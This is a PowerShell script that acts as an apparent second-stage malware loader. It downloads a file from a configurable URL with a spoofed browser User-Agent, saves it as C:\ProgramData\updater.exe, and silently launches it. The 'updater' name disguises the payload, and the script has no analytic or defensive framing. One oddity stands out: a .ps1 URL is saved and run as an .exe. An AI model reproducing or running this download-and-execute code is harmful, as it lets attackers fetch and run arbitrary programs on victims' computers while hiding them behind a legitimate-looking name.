
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://localhost:8000/updater.ps1",
    [string]$WorkingPath = 'C:\ProgramData\updater.exe',
    [int]$ConnectionTimeout = 149,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-Stage2Download -SourceUrl $TransferUrl -DestinationPath $WorkingPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($TransferResult) {
    Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
}

$StageMarker = "stage-39"
Start-Sleep -Seconds 20
